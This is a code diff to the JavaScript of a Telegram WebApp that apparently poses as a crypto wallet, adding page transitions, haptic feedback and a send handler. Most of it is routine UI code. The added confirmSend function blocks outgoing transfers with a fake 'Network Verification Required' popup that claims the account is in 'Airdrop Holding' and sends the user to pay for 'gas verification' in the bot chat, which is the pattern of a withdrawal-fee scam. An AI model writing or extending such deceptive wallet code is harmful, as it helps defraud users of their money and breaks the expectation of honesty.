@@ -1,34 +1,37 @@
 const tg = window.Telegram.WebApp;
 tg.expand();
-tg.backgroundColor = "#0a0a0a";
-tg.headerColor = "#0a0a0a";
 
-function showTab(tabId) {
-    const currentTab = document.querySelector('.tab-content.active');
-    const newTab = document.getElementById(tabId);
+function showPage(pageId) {
+    const current = document.querySelector('.page.active');
+    const target = document.getElementById(pageId);
 
-    if (currentTab.id === tabId) return;
+    if (current.id === pageId) return;
 
-    // GSAP Animation for smooth transition
-    gsap.to(currentTab, {
-        duration: 0.3,
-        opacity: 0,
-        x: -20,
-        onComplete: () => {
-            currentTab.classList.remove('active');
-            newTab.classList.add('active');
-            
-            gsap.fromTo(newTab, 
-                { opacity: 0, x: 20 }, 
-                { opacity: 1, x: 0, duration: 0.3 }
-            );
-        }
-    });
+    // Trigger Haptic Feedback (feels like a real app)
+    tg.HapticFeedback.impactOccurred('medium');
+
+    // Page Animation
+    gsap.to(current, { opacity: 0, y: -10, duration: 0.2, onComplete: () => {
+        current.classList.remove('active');
+        target.classList.add('active');
+        gsap.fromTo(target, { opacity: 0, y: 10 }, { opacity: 1, y: 0, duration: 0.4, ease: "back.out(1.7)" });
+    }});
 
     // Update Nav Icons
-    document.querySelectorAll('.nav-icon').forEach(icon => icon.classList.remove('active'));
-    // (Add logic here to match icon to tab)
+    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+    const navId = pageId.replace('page-', 'nav-');
+    const navIcon = document.getElementById(navId);
+    if (navIcon) navIcon.classList.add('active');
 }
 
-// Initial Animation
-gsap.from("#wallet", { opacity: 0, y: 30, duration: 0.8, ease: "power4.out" });
+function confirmSend() {
+    tg.HapticFeedback.notificationOccurred('error');
+    tg.showPopup({
+        title: 'Network Verification Required',
+        message: 'Your account is currently in "Airdrop Holding". To enable external transfers, please complete the gas verification in the bot chat.',
+        buttons: [{type: 'close'}]
+    });
+}
+
+// Initial Entry Animation
+gsap.from(".page.active", { opacity: 0, scale: 0.95, duration: 0.6 });
